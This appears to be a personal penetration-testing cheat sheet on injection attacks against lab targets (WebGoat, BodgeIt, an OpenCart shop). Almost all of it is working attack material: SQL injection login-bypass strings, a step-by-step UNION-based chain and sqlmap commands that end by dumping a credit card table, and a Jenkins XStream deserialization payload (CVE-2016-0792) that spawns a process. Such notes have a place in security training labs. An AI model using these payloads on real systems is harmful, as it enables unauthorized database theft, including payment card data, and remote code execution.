# A1 - Injection


## SQL Injection

### Into string 
BodgeIt login

`' or 1=1);--`

`admin@thebodgeitstore.com' or '1'='1);--`


### Numeric

Examples on [WebGoat](http://10.6.6.10:8080/WebGoat-5.4/attack?Screen=77&menu=1100)

```
SUBMIT=Go%21&station=102%2b1
SUBMIT=Go%21&station=102 or 1=1
SUBMIT=Go%21&station=102 ORDER BY 7
SUBMIT=Go%21&station=102 union select 1,null,user(),null,null from weather_data
```


Examples on ["AwesomeShop"](http://10.6.6.13/oc/)

Confirmation of SQLi

`http://10.6.6.13/oc/index.php?route=information/information/info&information_id=-2490%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28IFNULL%28CAST%28VERSION%28%29%20AS%20CHAR%29%2C0x20%29%29%2CNULL%2CNULL%23`

enumerate columns count

`http://10.6.6.13/oc/index.php?route=information/information/info&information_id=-2490%27%20order%20by%2010%23`

get db user, host, DBMS version, DB

`http://10.6.6.13/oc/index.php?route=information/information/info&information_id=-2490%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28USER%28%29%2C0x20%2CDATABASE%28%29%2C0x20%2C@@VERSION%29%2CNULL%2CNULL%23`

get tables count to iterate

`http://10.6.6.13/oc/index.php?route=information/information/info&information_id=-3444%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28COUNT%28*%29%29%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%28%27opencart%27%29%23`

get table names

`http://10.6.6.13/oc/index.php?route=information/information/info&information_id=-3444%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28table_name%29%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%28%27opencart%27%29%20limit%200,1%23`
... LIMIT 2,1


get column names

`http://10.6.6.13/oc/index.php?route=information/information/info&information_id=-3428' UNION ALL SELECT NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C(SELECT CONCAT(column_name,0x20,column_type) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='cc' AND table_schema='opencart' LIMIT 0,1)%2CNULL%2CNULL%2CNULL%23`
... LIMIT 2,1

dump the data

`http://10.6.6.13/oc/index.php?route=information/information/info&information_id=-3428%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C%28SELECT%20CONCAT%28id,0x2c,CSC,type,0x2c,ccnum,0x2c,state,0x2c,expire_m,0x2c,expire_y,0x2c,last_name,0x2c,first_name%29%20FROM%20opencart.cc%20LIMIT%200,1%29%2CNULL%2CNULL%2CNULL%23`


Using sqlmap
```
sqlmap -b --dbms=mysql --batch -u 'http://10.6.6.13/oc/index.php?route=information/information/info&information_id=3*'
sqlmap --current-db  --technique=U --dbms=mysql --batch -u 'http://10.6.6.13/oc/index.php?route=information/information/info&information_id=3*'
sqlmap --schema -D 'opencart' --technique=U --dbms=mysql --batch -u 'http://10.6.6.13/oc/index.php?route=information/information/info&information_id=3*'
sqlmap --dump -T 'cc' -D 'opencart' --technique=U --dbms=mysql --batch -u 'http://10.6.6.13/oc/index.php?route=information/information/info&information_id=3*'
```

## Deserialization / Object Injection
Jenkins CVE-2016-0792

```
<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="groovy.util.Expando" reference="../../../.."/>
            <owner class="java.lang.ProcessBuilder">
              <command>
                <string>open</string>
                <string>/Applications/Calculator.app</string>
              </command>
              <redirectErrorStream>false</redirectErrorStream>
            </owner>
            <resolveStrategy>0</resolveStrategy>
            <directive>0</directive>
            <parameterTypes/>
            <maximumNumberOfParameters>0</maximumNumberOfParameters>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>1</int>
  </entry>
</map>
```
